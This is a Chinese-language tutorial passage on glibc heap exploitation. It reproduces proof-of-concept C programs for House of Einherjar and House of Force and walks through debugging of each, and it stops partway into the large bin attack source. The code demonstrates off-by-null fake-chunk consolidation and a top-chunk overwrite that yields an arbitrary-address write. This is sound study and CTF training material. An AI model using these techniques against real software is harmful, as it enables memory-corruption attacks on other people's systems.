<h2 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house_of_einherjar"></a>house_of_einherjar</h2><h3 id="源码-10"><a href="#源码-10" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Credit to st4g3r for publishing this technique</span></span><br><span class="line"><span class="comment">   The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()</span></span><br><span class="line"><span class="comment">   This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak. </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">setbuf</span>(stdin, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Welcome to House of Einherjar!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Tested in Ubuntu 16.04 64bit.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">uint8_t</span>* a;</span><br><span class="line">	<span class="type">uint8_t</span>* b;</span><br><span class="line">	<span class="type">uint8_t</span>* d;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27;\n&quot;</span>);</span><br><span class="line">	a = (<span class="type">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a: %p\n&quot;</span>, a);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> real_a_size = <span class="built_in">malloc_usable_size</span>(a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;a&#x27;, we need the &#x27;real&#x27; size of &#x27;a&#x27; after rounding: %#x\n&quot;</span>, real_a_size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// create a fake chunk</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nWe create a fake chunk wherever we want, in this case we&#x27;ll create the chunk on the stack\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;However, you can also create the chunk in the heap or the bss, as long as you know its address\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;(although we could do the unsafe unlink technique here in some scenarios)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> fake_chunk[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line">	fake_chunk[<span class="number">0</span>] = <span class="number">0x100</span>; <span class="comment">// prev_size is now used and must equal fake_chunk&#x27;s size to pass P-&gt;bk-&gt;size == P-&gt;prev_size</span></span><br><span class="line">	fake_chunk[<span class="number">1</span>] = <span class="number">0x100</span>; <span class="comment">// size of the chunk just needs to be small enough to stay in the small bin</span></span><br><span class="line">	fake_chunk[<span class="number">2</span>] = (<span class="type">size_t</span>) fake_chunk; <span class="comment">// fwd</span></span><br><span class="line">	fake_chunk[<span class="number">3</span>] = (<span class="type">size_t</span>) fake_chunk; <span class="comment">// bck</span></span><br><span class="line">	fake_chunk[<span class="number">4</span>] = (<span class="type">size_t</span>) fake_chunk; <span class="comment">//fwd_nextsize</span></span><br><span class="line">	fake_chunk[<span class="number">5</span>] = (<span class="type">size_t</span>) fake_chunk; <span class="comment">//bck_nextsize</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, fake_chunk);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;prev_size (not used): %#lx\n&quot;</span>, fake_chunk[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;size: %#lx\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;fwd: %#lx\n&quot;</span>, fake_chunk[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;bck: %#lx\n&quot;</span>, fake_chunk[<span class="number">3</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;fwd_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="number">4</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;bck_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span></span><br><span class="line"><span class="comment">	 * a value of 0x00. The least significant byte of this will be 0x00, because the size of </span></span><br><span class="line"><span class="comment">	 * the chunk includes the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">	b = (<span class="type">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line">	<span class="type">int</span> real_b_size = <span class="built_in">malloc_usable_size</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0xf8 bytes for &#x27;b&#x27;.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span>* b_size_ptr = (<span class="type">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line">	<span class="comment">/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nb.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);</span><br><span class="line">	a[real_a_size] = <span class="number">0</span>; </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This is easiest if b.size is a multiple of 0x100 so you &quot;</span></span><br><span class="line">		   <span class="string">&quot;don&#x27;t change the size of b, only its prev_inuse bit\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;If it had been modified, we would need a fake chunk inside &quot;</span></span><br><span class="line">		   <span class="string">&quot;b where it will try to consolidate the next chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Write a fake prev_size to the end of a</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nWe write a fake prev_size to the last %lu bytes of a so that &quot;</span></span><br><span class="line">		   <span class="string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="built_in">sizeof</span>(<span class="type">size_t</span>));</span><br><span class="line">	<span class="type">size_t</span> fake_size = (<span class="type">size_t</span>)((b-<span class="built_in">sizeof</span>(<span class="type">size_t</span>)*<span class="number">2</span>) - (<span class="type">uint8_t</span>*)fake_chunk);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, b-<span class="built_in">sizeof</span>(<span class="type">size_t</span>)*<span class="number">2</span>, fake_chunk, fake_size);</span><br><span class="line">	*(<span class="type">size_t</span>*)&amp;a[real_a_size-<span class="built_in">sizeof</span>(<span class="type">size_t</span>)] = fake_size;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Change the fake chunk&#x27;s size to reflect b&#x27;s new prev_size</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nModify fake chunk&#x27;s size to reflect b&#x27;s new prev_size\n&quot;</span>);</span><br><span class="line">	fake_chunk[<span class="number">1</span>] = fake_size;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// free b and it will consolidate with our fake chunk</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//if we allocate another chunk before we free b we will need to </span></span><br><span class="line">	<span class="comment">//do two things: </span></span><br><span class="line">	<span class="comment">//1) We will need to adjust the size of our fake chunk so that</span></span><br><span class="line">	<span class="comment">//fake_chunk + fake_chunk&#x27;s size points to an area we control</span></span><br><span class="line">	<span class="comment">//2) we will need to write the size of our fake chunk</span></span><br><span class="line">	<span class="comment">//at the location we control. </span></span><br><span class="line">	<span class="comment">//After doing these two things, when unlink gets called, our fake chunk will</span></span><br><span class="line">	<span class="comment">//pass the size(P) == prev_size(next_chunk(P)) test. </span></span><br><span class="line">	<span class="comment">//otherwise we need to make sure that our fake chunk is up against the</span></span><br><span class="line">	<span class="comment">//wilderness</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);</span><br><span class="line">	d = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Next malloc(0x200) is at %p\n&quot;</span>, d);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="调试-10"><a href="#调试-10" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_F3ZFDGEK2RFX33H.png"
                      alt="图片描述"
                ><br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_F4BT7673NJYMD9K.png"
                      alt="图片描述"
                ><br>申请<code>a=0x41</code>，<code>b=0x101</code>两个堆块，并在栈上构建一个<code>fake_chunk</code>，并且<code>fake_chunk_fd_bk = fake_chunk_prev_size</code>，用来绕过<code>unlink</code>。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_8ZKFC6YP36TCPUC.png"
                      alt="图片描述"
                ><br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_69JHW2FXP62QRD8.png"
                      alt="图片描述"
                ><br>然后利用<code>off-by-null</code>漏洞将堆块<code>b</code>的<code>PREV_INUSE</code>位改为<code>0</code>，计算出堆块<code>b</code>与<code>fake_chunk</code>的距离(<code>fake_size</code>)，这里是个负数。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_G7UVK2Z39Q7V4N2.png"
                      alt="图片描述"
                ><br>然后将<code>fake_chunk_size</code>改为<code>fake_size</code>，然后将堆块<code>b</code>的<code>prev_size</code>改为改为<code>fake_size</code>，绕过检查<code>prev_size == size</code>的检查。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_2UT6ZP9UTJP74U9.png"
                      alt="图片描述"
                ><br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_4DKB7Y89T8FSWD8.png"
                      alt="图片描述"
                ><br>我们<code>free(b)</code>后，会进行如上检查。向后合并会把负数<code>fake_size</code>转为整数，然后会先开始后合并，又<code>chunk_b</code>紧邻<code>top_chunk</code>，会再与其进行合并。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_7ZCUWQ3KAVGKAB7.png"
                      alt="图片描述"
                ><br>此时我们再申请堆块将从<code>fake_chunk_prev_size</code>开始分配。</p>
<h2 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house_of_force"></a>house_of_force</h2><p><code>glibc &lt; 2.29</code></p>
<h3 id="源码-11"><a href="#源码-11" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   This PoC works also with ASLR enabled.</span></span><br><span class="line"><span class="comment">   It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.</span></span><br><span class="line"><span class="comment">   If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum </span></span><br><span class="line"><span class="comment">   ( http://phrack.org/issues/66/10.html )</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Tested in Ubuntu 14.04, 64bit, Ubuntu 18.04</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> bss_var[] = <span class="string">&quot;This is a string that we want to overwrite.&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc , <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nWelcome to the House of Force\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The top chunk is a special chunk. Is the last in memory &quot;</span></span><br><span class="line">		<span class="string">&quot;and is the chunk that will be resized when malloc asks for more space from the os.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nIn the end, we will use this to overwrite a variable at %p.\n&quot;</span>, bss_var);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Its current value is: %s\n&quot;</span>, bss_var);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nLet&#x27;s allocate the first chunk, taking space from the wilderness.\n&quot;</span>);</span><br><span class="line">	<span class="type">intptr_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The chunk of 256 bytes has been allocated at %p.\n&quot;</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n&quot;</span>);</span><br><span class="line">	<span class="type">int</span> real_size = <span class="built_in">malloc_usable_size</span>(p1);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Real size (aligned and all that jazz) of our allocated chunk is %ld.\n&quot;</span>, real_size + <span class="built_in">sizeof</span>(<span class="type">long</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nNow let&#x27;s emulate a vulnerability that can overwrite the header of the Top Chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//----- VULNERABILITY ----</span></span><br><span class="line">	<span class="type">intptr_t</span> *ptr_top = (<span class="type">intptr_t</span> *) ((<span class="type">char</span> *)p1 + real_size - <span class="built_in">sizeof</span>(<span class="type">long</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nThe top chunk starts at %p\n&quot;</span>, ptr_top);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Old size of top chunk %#llx\n&quot;</span>, *((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)((<span class="type">char</span> *)ptr_top + <span class="built_in">sizeof</span>(<span class="type">long</span>))));</span><br><span class="line">	*(<span class="type">intptr_t</span> *)((<span class="type">char</span> *)ptr_top + <span class="built_in">sizeof</span>(<span class="type">long</span>)) = <span class="number">-1</span>;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;New size of top chunk %#llx\n&quot;</span>, *((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)((<span class="type">char</span> *)ptr_top + <span class="built_in">sizeof</span>(<span class="type">long</span>))));</span><br><span class="line">	<span class="comment">//------------------------</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n&quot;</span></span><br><span class="line">	   <span class="string">&quot;Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n&quot;</span></span><br><span class="line">	   <span class="string">&quot;overflow) and will then be able to allocate a chunk right over the desired region.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):</span></span><br><span class="line"><span class="comment">	 * new_top = old_top + nb</span></span><br><span class="line"><span class="comment">	 * nb = new_top - old_top</span></span><br><span class="line"><span class="comment">	 * req + 2sizeof(long) = new_top - old_top</span></span><br><span class="line"><span class="comment">	 * req = new_top - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment">	 * req = dest - 2sizeof(long) - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment">	 * req = dest - old_top - 4*sizeof(long)</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> evil_size = (<span class="type">unsigned</span> <span class="type">long</span>)bss_var - <span class="built_in">sizeof</span>(<span class="type">long</span>)*<span class="number">4</span> - (<span class="type">unsigned</span> <span class="type">long</span>)ptr_top;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n&quot;</span></span><br><span class="line">	   <span class="string">&quot;we will malloc %#lx bytes.\n&quot;</span>, bss_var, ptr_top, evil_size);</span><br><span class="line">	<span class="type">void</span> *new_ptr = <span class="built_in">malloc</span>(evil_size);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;As expected, the new pointer is at the same place as the old top chunk: %p\n&quot;</span>, new_ptr - <span class="built_in">sizeof</span>(<span class="type">long</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span>* ctr_chunk = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nNow, the next chunk we overwrite will point at our target buffer.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;malloc(100) =&gt; %p!\n&quot;</span>, ctr_chunk);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we can finally overwrite that value:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;... old string: %s\n&quot;</span>, bss_var);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;... doing strcpy overwrite with \&quot;YEAH!!!\&quot;...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(ctr_chunk, <span class="string">&quot;YEAH!!!&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;... new string: %s\n&quot;</span>, bss_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">assert</span>(ctr_chunk == bss_var);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// some further discussion:</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n&quot;);</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;This because the main_arena-&gt;top pointer is setted to current av-&gt;top + malloc_size &quot;</span></span><br><span class="line">	<span class="comment">//	&quot;and we \nwant to set this result to the address of malloc_got_address-8\n\n&quot;);</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n&quot;);</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;The av-&gt;top after this big malloc will be setted in this way to malloc_got_address-8\n\n&quot;);</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;After that a new call to malloc will return av-&gt;top+8 ( +8 bytes for the header ),&quot;</span></span><br><span class="line">	<span class="comment">//	&quot;\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n&quot;);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;The large chunk with evil_size has been allocated here 0x%08x\n&quot;,p2);</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;The main_arena value av-&gt;top has been setted to malloc_got_address-8=0x%08x\n&quot;,malloc_got_address);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;This last malloc will be served from the remainder code and will return the av-&gt;top+8 injected before\n&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="调试-11"><a href="#调试-11" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_D3DCDBFN6BFS7AY.png"
                      alt="图片描述"
                ><br>首先申请了一个<code>a_real=0x111</code>大小的堆块，利用<code>off-by-one</code>将<code>top_chunk</code>的<code>size</code>改为<code>-1</code>，此时我们便可以申请到任意地址，<code>top_chunk地址 = 原top_chunk地址 + 对齐后的申请大小</code>。只要我们计算好距离，便可申请到任意地址，下到<code>got</code>,<code>bss</code>，上到<code>__malloc_hook</code>，相当于任意地址写的能力。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_KN4WJWSJJ4HC9VE.png"
                      alt="图片描述"
                ><br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_FRYZ59TQMSFW6TK.png"
                      alt="图片描述"
                ><br>计算出<code>bss_var-0x20</code>到<code>top_chunk</code>的距离<code>0x602060-0x603110=-5A2 E0B0</code>，注意此时我们申请结束后，<code>top_chunk=0x6030110+(-5A2EB0)+0x10=0x602070</code>，成功将top_chunk迁移到了目标地址下方。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_QRUXTS646FKXEAS.png"
                      alt="图片描述"
                ><br>堆由低地址向高地址增长，我们此时申请<code>0x68</code>大小的堆块时，<code>top_chunk=0x602070+0x68+0x8=0x6020e0</code>，成功将目标地址放入新申请堆块的<code>fd</code>指针处。</p>
<h2 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large_bin_attack"></a>large_bin_attack</h2><p><code>glibc-2.29</code> 之前的 <code>large_bin_attack</code> 可以修改两个值。</p>
<h3 id="源码-12"><a href="#源码-12" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    This technique is taken from</span></span><br><span class="line"><span class="comment">    https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    [...]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">              else</span></span><br><span class="line"><span class="comment">              &#123;</span></span><br><span class="line"><span class="comment">                  victim-&gt;fd_nextsize = fwd;</span></span><br><span class="line"><span class="comment">                  victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span></span><br><span class="line"><span class="comment">                  fwd-&gt;bk_nextsize = victim;</span></span><br><span class="line"><span class="comment">                  victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span></span><br><span class="line"><span class="comment">              &#125;</span></span><br><span class="line"><span class="comment">              bck = fwd-&gt;bk;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    [...]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    mark_bin (av, victim_index);</span></span><br><span class="line"><span class="comment">    victim-&gt;bk = bck;</span></span><br><span class="line"><span class="comment">    victim-&gt;fd = fwd;</span></span><br><span class="line"><span class="comment">    fwd-&gt;bk = victim;</span></span><br><span class="line"><span class="comment">    bck-&gt;fd = victim;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    For more details on how large-bins are handled and sorted by ptmalloc,</span></span><br><span class="line"><span class="comment">    please check the Background section in the aforementioned link.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    [...]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span 